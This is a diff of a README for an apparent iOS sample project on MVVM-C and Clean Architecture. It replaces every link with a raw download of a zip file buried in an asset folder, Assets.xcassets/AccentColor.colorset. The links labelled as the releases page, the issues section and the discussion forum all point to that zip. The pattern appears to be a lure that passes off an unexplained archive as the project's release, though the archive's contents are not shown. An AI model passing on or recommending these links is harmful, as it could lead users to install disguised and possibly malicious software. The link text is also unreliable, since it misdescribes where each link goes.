@@ -1,7 +1,7 @@
 # 🎉 MVVM-C-Factory-Repository-CleanArch - A Scalable iOS Project Example
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip%20Latest%https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip)](https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip)
+[![Download](https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip%20Latest%https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip)](https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip)
 
 ## 📝 Project Overview
 MVVM-C-Factory-Repository-CleanArch is an example iOS application designed with principles of MVVM-C, Factory, Repository, and Clean Architecture. This project focuses on loose coupling and testability, making it a great resource for developers looking to create scalable applications. 
@@ -10,7 +10,7 @@ MVVM-C-Factory-Repository-CleanArch is an example iOS application designed with 
 To get started with MVVM-C-Factory-Repository-CleanArch, follow these simple steps:
 
 1. **Visit the Download Page**
-   Go to our releases page: [Download Release](https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip)
+   Go to our releases page: [Download Release](https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip)
 
 2. **Choose the Right Release**
    On the releases page, find the latest version. Look for the most recent date listed on that page.
@@ -63,8 +63,8 @@ If you encounter any issues while downloading or running the app, consider these
 ## 👥 Community and Support
 For further assistance or to connect with other users, you can join our community:
 
-- **GitHub Issues**: Report any bugs or issues via the [Issues section](https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip) on GitHub.
-- **Discussion Forum**: Engage with peers and share ideas on our [Discussion page](https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip).
+- **GitHub Issues**: Report any bugs or issues via the [Issues section](https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip) on GitHub.
+- **Discussion Forum**: Engage with peers and share ideas on our [Discussion page](https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip).
 
 ## 🧩 Future Work
 We are continuously improving this project. Future updates may include:
@@ -77,6 +77,6 @@ We are continuously improving this project. Future updates may include:
 For any queries or suggestions, you can reach out via the feedback form found on our GitHub page. Your input is valuable for the growth and enhancement of this project. 
 
 ## 🌍 Links
-[Download Release](https://raw.githubusercontent.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/main/MVVM-C-Factory-Repository-CleanArch/Domain/Arch-Factory-Repository-MVV-Clean-1.1.zip)
+[Download Release](https://github.com/ludo6060/MVVM-C-Factory-Repository-CleanArch/raw/refs/heads/main/MVVM-C-Factory-Repository-CleanArch/Resources/Assets.xcassets/AccentColor.colorset/Repository-Arch-MVV-Factory-Clean-2.8.zip)
 
 Explore this project today and enhance your iOS development skills with MVVM-C-Factory-Repository-CleanArch!
